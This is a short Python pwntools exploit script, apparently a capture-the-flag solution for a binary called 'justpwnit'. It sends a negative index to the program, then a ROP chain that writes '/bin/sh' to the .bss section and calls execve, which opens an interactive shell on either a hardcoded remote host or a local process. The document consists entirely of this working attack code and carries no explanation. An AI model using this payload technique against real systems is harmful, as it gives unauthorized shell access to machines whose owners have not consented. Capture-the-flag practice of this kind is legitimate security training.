#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./justpwnit"
#"""
HOST = "168.119.108.148"
PORT = 11010 
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_bss = elf.bss()

rdi_ret = 0x408989
rsi_ret = 0x4019a3
rdx_ret = 0x4085b5
rax_ret = 0x408a26
syscall = 0x4013e9
mov_ptr_rdi_rsi_ret = 0x406c3c

def exploit():
	payload = p64(0)
	payload += p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_ret)
	payload += b"/bin/sh\x00"
	payload += p64(mov_ptr_rdi_rsi_ret)
	payload += p64(rsi_ret)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0)
	payload += p64(rax_ret)
	payload += p64(59)
	payload += p64(syscall)

	conn.sendlineafter(": ", "-2")	
	conn.sendlineafter(": ", payload)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
